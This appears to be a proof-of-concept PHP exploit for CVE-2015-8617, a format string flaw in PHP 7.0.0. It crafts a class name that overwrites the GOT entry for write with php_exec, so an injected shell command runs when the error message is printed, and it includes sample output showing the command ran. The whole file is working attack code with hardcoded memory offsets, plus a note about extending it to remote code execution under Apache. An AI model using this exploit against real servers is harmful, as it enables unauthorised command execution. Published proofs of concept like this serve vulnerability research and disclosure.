<?php
/*
https://www.exploit-db.com/exploits/39082/
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8617

Overwrite GOT write to php_exec@.text -> when the error message displays our command gets executed 

Output:
d@ubuntupwn:~/php/php-7.0.0/sapi/cli$ ./php a.php
sh: 2: Fatal: not found
Segmentation fault (core dumped)
d@ubuntupwn:~/php/php-7.0.0/sapi/cli$ cat pwned.txt
pwned

TODO:
	RCE when running under apache or similar
*/	

//00000000620920 T php_exec
$php_exec = 0x620920 - 27;
$cmd = "'$(echo pwned > ./pwned.txt)";

$php_exec = 0x00000000620920 - (15+strlen($cmd));

//000000ea2298  038e00000007 R_X86_64_JUMP_SLO 0000000000421360 write + 0
$write_got = 0x000000ea2298 - (22+strlen($cmd));

$name = $cmd . "%" . $php_exec . "c" . "%p%p" . "%n" . str_repeat("A",$write_got);

$name::ch00ch00();

?>

